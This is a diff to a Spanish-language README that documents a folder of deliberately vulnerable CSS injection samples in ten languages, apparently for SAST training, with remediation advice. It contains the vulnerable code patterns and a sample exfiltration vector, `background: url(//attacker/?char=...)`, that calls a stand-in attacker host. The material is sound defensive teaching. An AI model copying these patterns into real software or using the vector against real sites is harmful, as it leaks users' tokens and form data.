@@ -1,63 +1,129 @@
 # CSS Injection (CSSI)
 
-Este README aplica a todos los ejemplos de la carpeta. Aunque la sintaxis cambia entre lenguajes, la causa raiz de la vulnerabilidad es la misma.
+## Descripción General
+Aparece cuando datos controlados por el usuario se insertan directamente dentro de etiquetas `<style>` o atributos `style=""` sin neutralización. Los atacantes pueden inyectar reglas CSS que cargan recursos externos condicionalmente mediante selectores de atributos (ej. `input[value^="a"] { background: url(...) }`), permitiendo la exfiltración carácter por carácter de tokens sensibles, contraseñas o contenido de la página.
 
-## Que hace vulnerable al patron
-El patron vulnerable consiste en insertar datos del usuario dentro de reglas CSS o atributos `style` sin validacion.
-Aunque CSS no siempre ejecuta JavaScript, si puede alterar la interfaz, ocultar elementos, superponer controles, cargar recursos externos o apoyar ataques de UI redressing.
+## Patrones y Señales para Análisis SAST
+- Interpolación de parámetros en bloques `<style>` o atributos `style`.
+- Falta de sanitización de caracteres como `{`, `}`, `@import`, `url()` y `;`.
 
-## Como identificar casos similares
-- Interpolacion de entrada del usuario en `<style>`, `style=` o selectores.
-- Temas personalizables sin lista de propiedades permitidas.
-- Plantillas que construyen CSS a partir de texto arbitrario.
+## Estrategia de Mitigación y Buenas Prácticas
+- Evitar generar estilos CSS dinámicos a partir de entradas de usuario.
+- Si es indispensable permitir personalización visual, restringir a una allowlist estricta de nombres de clases o colores válidos.
+- Implementar Content Security Policy (CSP) restrictiva prohibiendo `unsafe-inline` en directivas `style-src`.
 
-## Explicacion por lenguaje
-### Python (`python.py`)
-Fragmento representativo: `return f'<style>{request.args.get("css","body{}")}</style>'`
-En este ejemplo, lo vulnerable es tratar CSS como si fuera texto inocuo cuando en realidad modifica activamente el comportamiento visual de la pagina. En Python, usar f-strings, concatenacion, carga directa de objetos o parseo sin restricciones no agrega ninguna proteccion automatica.
-Para encontrar casos parecidos en Python, busca entrada del usuario insertada en bloques CSS, atributos `style` o generadores de hojas de estilo.
+## Análisis Técnico y Ejemplos por Lenguaje
 
-### JavaScript (`javascript.js`)
-Fragmento representativo: `function demo(req, res) { res.send(`<style>${req.query.css}</style>`); }`
-En este ejemplo, lo vulnerable es tratar CSS como si fuera texto inocuo cuando en realidad modifica activamente el comportamiento visual de la pagina. En JavaScript, los valores que vienen de `req`, `body`, `query` o merges de objetos llegan intactos al sink si no se validan antes.
-Para encontrar casos parecidos en JavaScript, busca entrada del usuario insertada en bloques CSS, atributos `style` o generadores de hojas de estilo.
+### 1. Python ([python.py](./python.py))
+```python
+# CSS Injection (CSSI)
+def demo():
+    return f'<style>{request.args.get("css", "body{}")}</style>'
+```
+- **Sink peligroso y causa raíz:** Interpolación de `request.args["css"]` en bloques `<style>`.
+- **Mecanismo de explotación y vector:** Exfiltración de tokens CSRF y valores de inputs mediante selectores de atributo CSS.
+- **Remediación idiomática:** Permitir únicamente identificadores predefinidos de temas en lugar de CSS arbitrario.
 
-### Java (`java.java`)
-Fragmento representativo: `public class Example { public void demo() throws Exception { response.getWriter().write("<style>"+request.getParameter("css")+"</style>"); } }`
-En este ejemplo, lo vulnerable es tratar CSS como si fuera texto inocuo cuando en realidad modifica activamente el comportamiento visual de la pagina. En Java, concatenar `String`, deserializar o consumir datos de `request` deja toda la seguridad en la logica de la aplicacion.
-Para encontrar casos parecidos en Java, busca entrada del usuario insertada en bloques CSS, atributos `style` o generadores de hojas de estilo.
+### 2. JavaScript / Node.js ([javascript.js](./javascript.js))
+```javascript
+// CSS Injection (CSSI)
+function demo(req, res) {
+  res.send(`<style>${req.query.css}</style>`);
+  }
+```
+- **Sink peligroso y causa raíz:** Inyección directa de parámetros en cadenas HTML con `<style>${css}</style>`.
+- **Mecanismo de explotación y vector:** Robo de datos sensibles en el navegador sin necesidad de ejecutar JavaScript directo.
+- **Remediación idiomática:** Sanitizar con allowlists de valores o usar CSP estricto `style-src 'self'`.
 
-### Go (`go.go`)
-Fragmento representativo: `package main func demo() { fmt.Fprintf(w,"<style>%s</style>",r.URL.Query().Get("css")) }`
-En este ejemplo, lo vulnerable es tratar CSS como si fuera texto inocuo cuando en realidad modifica activamente el comportamiento visual de la pagina. En Go, tomar valores desde `r.URL.Query()`, `body` o estructuras similares y pasarlos a APIs sensibles no introduce sanitizacion por defecto.
-Para encontrar casos parecidos en Go, busca entrada del usuario insertada en bloques CSS, atributos `style` o generadores de hojas de estilo.
+### 3. Java ([java.java](./java.java))
+```java
+// CSS Injection (CSSI)
+public class Example {
+  public void demo() throws Exception {
+    response.getWriter().write("<style>"+request.getParameter("css")+"</style>");
+      }
+}
+```
+- **Sink peligroso y causa raíz:** Concatenación de parámetros en la respuesta con `<style>` en servlets.
+- **Mecanismo de explotación y vector:** Filtración de datos y alteración de la interfaz para ataques de phishing.
+- **Remediación idiomática:** Restringir estilos a propiedades y valores validados con regex positiva (ej. códigos hexadecimales `#RRGGBB`).
 
-### PHP (`php.php`)
-Fragmento representativo: `echo '<style>'.$_GET['css'].'</style>';`
-En este ejemplo, lo vulnerable es tratar CSS como si fuera texto inocuo cuando en realidad modifica activamente el comportamiento visual de la pagina. En PHP, usar `$_GET`, `$_POST`, `php://input` o variables equivalentes directamente es un patron clasico de vulnerabilidad.
-Para encontrar casos parecidos en PHP, busca entrada del usuario insertada en bloques CSS, atributos `style` o generadores de hojas de estilo.
+### 4. Go ([go.go](./go.go))
+```go
+// CSS Injection (CSSI)
+package main
+func demo() {
+  fmt.Fprintf(w,"<style>%s</style>",r.URL.Query().Get("css"))
+  }
+```
+- **Sink peligroso y causa raíz:** Uso de `fmt.Fprintf` para renderizar hojas de estilo dinámicas con input.
+- **Mecanismo de explotación y vector:** Exfiltración de información confidencial en el navegador.
+- **Remediación idiomática:** Validar estrictamente con regex alfanumérica o códigos de color seguros.
 
-### Perl (`perl.pl`)
-Fragmento representativo: `sub demo { print '<style>' . param('css') . '</style>'; }`
-En este ejemplo, lo vulnerable es tratar CSS como si fuera texto inocuo cuando en realidad modifica activamente el comportamiento visual de la pagina. En Perl, las variables interpoladas o concatenadas conservan el control del atacante sobre la operacion final.
-Para encontrar casos parecidos en Perl, busca entrada del usuario insertada en bloques CSS, atributos `style` o generadores de hojas de estilo.
+### 5. PHP ([php.php](./php.php))
+```php
+<?php
+// CSS Injection (CSSI)
+echo '<style>'.$_GET['css'].'</style>';
+```
+- **Sink peligroso y causa raíz:** Echo directo de `$_GET["css"]` dentro de etiquetas `<style>`.
+- **Mecanismo de explotación y vector:** Carga de URLs maliciosas externas mediante `background: url(//attacker/?char=...)`.
+- **Remediación idiomática:** Aplicar allowlist estricta de estilos o usar `htmlspecialchars()` si se renderiza como texto.
 
-### Pascal (`pascal.pas`)
-Fragmento representativo: `program Example; begin Response.Content := '<style>' + Request.QueryFields.Values['css'] + '</style>'; end.`
-En este ejemplo, lo vulnerable es tratar CSS como si fuera texto inocuo cuando en realidad modifica activamente el comportamiento visual de la pagina. En Pascal, concatenar strings o reutilizar datos de `Request` transmite el valor no confiable hasta la operacion sensible.
-Para encontrar casos parecidos en Pascal, busca entrada del usuario insertada en bloques CSS, atributos `style` o generadores de hojas de estilo.
+### 6. C# (.NET) ([csharp.cs](./csharp.cs))
+```csharp
+// CSS Injection (CSSI)
+public class Example {
+  public void Demo() {
+    Response.Write("<style>" + Request.Query["css"] + "</style>");
+      }
+}
+```
+- **Sink peligroso y causa raíz:** Asignación directa de CSS desde `Request.Query` en vistas Razor.
+- **Mecanismo de explotación y vector:** Robo de datos confidenciales en el cliente.
+- **Remediación idiomática:** Usar clases CSS parametrizadas en lugar de inyección de sintaxis CSS.
 
-### Ruby (`ruby.rb`)
-Fragmento representativo: `def demo(params) render html: "<style>#{params[:css]}</style>".html_safe end`
-En este ejemplo, lo vulnerable es tratar CSS como si fuera texto inocuo cuando en realidad modifica activamente el comportamiento visual de la pagina. En Ruby, `params` e interpolacion hacen muy facil que la entrada del usuario llegue intacta a una API peligrosa.
-Para encontrar casos parecidos en Ruby, busca entrada del usuario insertada en bloques CSS, atributos `style` o generadores de hojas de estilo.
+### 7. Ruby ([ruby.rb](./ruby.rb))
+```ruby
+# CSS Injection (CSSI)
+def demo(params)
+  render html: "<style>#{params[:css]}</style>".html_safe
+  end
+```
+- **Sink peligroso y causa raíz:** Renderizado de `params[:css]` dentro de tags `<style>`.
+- **Mecanismo de explotación y vector:** Lectura ciega de campos de formulario protegidos.
+- **Remediación idiomática:** Restringir a opciones fijas de diseño en el modelo.
 
-### Rust (`rust.rs`)
-Fragmento representativo: `fn demo() { let html = format!("<style>{}</style>", css); }`
-En este ejemplo, lo vulnerable es tratar CSS como si fuera texto inocuo cuando en realidad modifica activamente el comportamiento visual de la pagina. En Rust, la seguridad de memoria no evita fallas de logica: deserializar, concatenar o invocar APIs peligrosas con datos no confiables sigue siendo riesgoso.
-Para encontrar casos parecidos en Rust, busca entrada del usuario insertada en bloques CSS, atributos `style` o generadores de hojas de estilo.
+### 8. Rust ([rust.rs](./rust.rs))
+```rust
+// CSS Injection (CSSI)
+fn demo() {
+  let html = format!("<style>{}</style>", css);
+  }
+```
+- **Sink peligroso y causa raíz:** Formateo de respuestas HTML con CSS arbitrario del cliente.
+- **Mecanismo de explotación y vector:** Exfiltración condicional de credenciales.
+- **Remediación idiomática:** Usar allowlists de nombres de clases predefinidas.
 
-### C# (`csharp.cs`)
-Fragmento representativo: `public class Example { public void Demo() { Response.Write("<style>" + Request.Query["css"] + "</style>"); } }`
-En este ejemplo, lo vulnerable es tratar CSS como si fuera texto inocuo cuando en realidad modifica activamente el comportamiento visual de la pagina. En C#, interpolacion, concatenacion, model binding o deserializacion no sustituyen validacion, autorizacion ni listas permitidas.
-Para encontrar casos parecidos en C#, busca entrada del usuario insertada en bloques CSS, atributos `style` o generadores de hojas de estilo.
+### 9. Perl ([perl.pl](./perl.pl))
+```perl
+# CSS Injection (CSSI)
+sub demo {
+  print '<style>' . param('css') . '</style>';
+  }
+```
+- **Sink peligroso y causa raíz:** Impresión de estilos recibidos por parámetro.
+- **Mecanismo de explotación y vector:** Ataques de inferencia de datos basados en CSS.
+- **Remediación idiomática:** Neutralizar caracteres que permitan abrir y cerrar bloques CSS.
+
+### 10. Pascal / Free Pascal ([pascal.pas](./pascal.pas))
+```pascal
+{ CSS Injection (CSSI) }
+program Example;
+begin
+  Response.Content := '<style>' + Request.QueryFields.Values['css'] + '</style>';
+  end.
+```
+- **Sink peligroso y causa raíz:** Inclusión de CSS externo en el cuerpo de la respuesta.
+- **Mecanismo de explotación y vector:** Manipulación de estilos e intercepción visual.
+- **Remediación idiomática:** Reemplazar por clases CSS estáticas precompiladas.
